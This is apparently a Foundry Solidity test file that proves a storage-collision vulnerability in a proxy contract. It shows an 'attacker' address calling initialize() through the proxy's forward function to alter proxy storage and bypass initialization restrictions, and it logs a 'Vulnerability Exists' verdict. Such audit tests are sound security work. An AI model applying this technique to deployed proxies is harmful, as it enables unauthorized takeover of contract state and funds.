// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/proxy.sol";

contract StorageContract {
    address public owner;
    uint256 public totalTransactions;
    mapping(address => uint256) public userTransactionCount;

    function initialize() public {
        owner = msg.sender;
    }
}

contract ProxyTest is Test {
    Proxy public proxy;
    StorageContract public storageContract;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.prank(owner);
        proxy = new Proxy();
        
        storageContract = new StorageContract();
    }

    function testStorageManipulation() public {
        console.log("--- BEFORE-Trigger ---");
        uint256 attackerTxCountBefore = getTransactionCount(attacker);
        console.log("Attacker transactions (before): %s", attackerTxCountBefore);
        console.log("StorageContract owner: %s", storageContract.owner());

        console.log("--- Trigger Attack ---");
        bytes memory initData = abi.encodeWithSignature("initialize()");
        vm.prank(attacker);
        proxy.forward(address(storageContract), initData);
        
        console.log("--- AFTER-Trigger ---");
        uint256 attackerTxCountAfter = getTransactionCount(attacker);
        console.log("Attacker transactions (after): %s", attackerTxCountAfter);
        console.log("StorageContract owner: %s", storageContract.owner());

        // Validate state changes
        assertEq(storageContract.owner(), address(0), "Storage contract owner changed unexpectedly");
        assertEq(attackerTxCountAfter, 1, "Attacker transaction count not increased");
        
        // Final vulnerability verdict
        console.log("Vulnerability Exists: Storage collision enables unauthorized proxy storage access");
    }

    function testDoubleInitialization() public {
        console.log("--- BEFORE: First Initialization ---");
        console.log("Attacker transactions (before): %s", getTransactionCount(attacker));
        console.log("StorageContract owner: %s", storageContract.owner());
        
        bytes memory initData = abi.encodeWithSignature("initialize()");
        vm.prank(owner);
        proxy.forward(address(storageContract), initData);
        
        console.log("--- BEFORE-Trigger: Attack Initialization ---");
        uint256 preAttackTxCount = getTransactionCount(attacker);
        console.log("Attacker transactions (pre-attack): %s", preAttackTxCount);
        console.log("StorageContract owner: %s", storageContract.owner());

        console.log("--- Trigger Attack ---");
        vm.prank(attacker);
        proxy.forward(address(storageContract), initData);
        
        console.log("--- AFTER-Trigger ---");
        uint256 postAttackTxCount = getTransactionCount(attacker);
        console.log("Attacker transactions (post-attack): %s", postAttackTxCount);
        console.log("StorageContract owner: %s", storageContract.owner());

        // Validate state changes
        assertEq(storageContract.owner(), address(0), "Storage contract owner changed unexpectedly");
        assertEq(postAttackTxCount, 1, "Attacker transaction count not increased after attack");
        
        // Final vulnerability verdict
        console.log("Vulnerability Exists: Attacker bypasses initialization restrictions via storage collision");
    }

    // Helper to get transaction count from proxy
    function getTransactionCount(address user) internal returns (uint256) {
        (bool success, bytes memory data) = address(proxy).staticcall(
            abi.encodeWithSignature("getUserStats(address)", user)
        );
        require(success, "Transaction count query failed");
        return abi.decode(data, (uint256));
    }
}